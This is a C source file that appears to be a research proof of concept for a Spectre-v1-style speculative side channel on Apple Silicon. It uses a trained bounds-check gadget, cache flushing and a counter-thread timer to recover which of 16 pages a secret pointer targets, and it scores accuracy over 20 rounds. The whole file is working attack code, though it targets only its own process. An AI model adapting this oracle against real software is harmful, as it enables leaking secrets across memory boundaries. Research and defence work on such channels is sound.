// same_process_page_oracle.c - self-contained 16-way page oracle, timed.
// same architecture as the measured self-contained page oracle that scored
// 20/20 in a representative run.
// one-hop prfm gadget, all in one binary, 16 candidates.
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BOUND     16
#define PLANT_X   18
#define TRIALS    16000
#define TRAIN     30
#define PAGE      16384
#define L2        (32*1024*1024)
#define N_CANDS   16
#define ROUNDS    20

static volatile uint64_t g_t; static volatile int g_r;
static void *tf(void *a){(void)a; pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0); while(g_r) g_t++; return NULL;}
static inline void bar(void){__asm__ volatile("dsb sy\n\tisb":::"memory");}
static inline uint64_t tl(volatile uint8_t *p){
    bar(); uint64_t a=g_t; bar();
    volatile uint8_t v=*p; __asm__ volatile("":: "r"(v):"memory");
    bar(); uint64_t b=g_t; return b-a;
}
static inline void cfl(void *p){__asm__ volatile("dc civac,%0"::"r"(p):"memory");}

static uint64_t victim[BOUND+4] __attribute__((aligned(128)));
static volatile uint64_t *bp;
static uint8_t *D, *l2b;
static uint8_t *cands[N_CANDS];

static void evict(void){
    volatile uint64_t s=0;
    for(size_t i=0;i<L2;i+=128) s^=l2b[i];
    (void)s; bar();
}

__attribute__((noinline))
static void gadget(uint64_t x){
    if(x < *bp){
        uint8_t *p=(uint8_t*)victim[x];
        __asm__ volatile("prfm pldl1keep, [%0]"::"r"(p):"memory");
    }
}

int main(void){
    setbuf(stdout,NULL);
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0);
    volatile uint64_t spin=0;
    for(uint64_t i=0;i<2000000000ULL;i++) spin++;
    (void)spin;
    mach_timebase_info_data_t tb; mach_timebase_info(&tb);
    uint64_t t0c=mach_absolute_time(); volatile uint64_t xc=0;
    __asm__ volatile("1:\n\tadd %0,%0,#1\n\tsubs %1,%1,#1\n\tb.ne 1b"
        :"+r"(xc):"r"((uint64_t)5e8):);
    double ghz=5e8/((mach_absolute_time()-t0c)*tb.numer/tb.denom);
    if(ghz<3.0){fprintf(stderr,"E-core\n"); return 2;}

    g_r=1; pthread_t tid; pthread_create(&tid,NULL,tf,NULL);
    while(!g_t){} usleep(10000);

    D=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    D[0]=0xFF;
    for(int i=0;i<N_CANDS;i++){
        cands[i]=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
        cands[i][0]=(uint8_t)i;
    }
    l2b=mmap(NULL,L2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    memset(l2b,1,L2);
    void *b=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    bp=b; *bp=BOUND;
    for(int i=0;i<BOUND;i++) victim[i]=(uint64_t)D;
    srand(0xA510);

    printf("SELF-CONTAINED 16-WAY ORACLE  clock=%.2f GHz  %d trials/round  %d rounds\n\n",
           ghz, TRIALS, ROUNDS);

    int correct=0;
    for(int r=0;r<ROUNDS;r++){
        int secret=rand()%N_CANDS;
        victim[PLANT_X]=(uint64_t)cands[secret];

        int hits[N_CANDS]={0};
        for(int t=0;t<TRIALS;t++){
            if(t%4000==0) fprintf(stderr,"\rround %d/%d trial %d/%d",r+1,ROUNDS,t,TRIALS);
            for(int tr=0;tr<TRAIN;tr++) gadget(rand()&0xf);
            for(int i=0;i<N_CANDS;i++) cfl(cands[i]);
            bar(); evict();
            cfl((void*)bp); bar();
            cfl(&victim[PLANT_X]); bar(); evict();
            for(int i=0;i<BOUND;i++) __asm__ volatile("":: "r"(victim[i]):"memory");
            __asm__ volatile("":: "r"(D[0]):"memory"); bar();
            gadget(PLANT_X);
            int order[N_CANDS];
            for(int i=0;i<N_CANDS;i++) order[i]=i;
            for(int i=N_CANDS-1;i>0;i--){int j=rand()%(i+1); int tmp=order[i]; order[i]=order[j]; order[j]=tmp;}
            (void)tl(D);
            int best=-1; uint64_t best_t=UINT64_MAX;
            for(int i=0;i<N_CANDS;i++){
                int c=order[i]; uint64_t tt=tl(cands[c]);
                if(tt<best_t){best_t=tt;best=c;}
            }
            uint64_t td=tl(D);
            if(best>=0 && best_t<td) hits[best]++;
        }
        fprintf(stderr,"\r                                         \r");
        int top=0; for(int i=1;i<N_CANDS;i++) if(hits[i]>hits[top]) top=i;
        int ok=(top==secret); correct+=ok;
        printf("round %2d: secret=%2d guess=%2d  %s\n", r+1, secret, top, ok?"CORRECT":"wrong");
    }
    printf("\naccuracy: %d/%d (%.1f%%)  chance=%.1f%%  lift=%.1fx\n",
           correct,ROUNDS,100.0*correct/ROUNDS,100.0/N_CANDS,(double)correct/ROUNDS/(1.0/N_CANDS));

    g_r=0; pthread_join(tid,NULL);
    return 0;
}
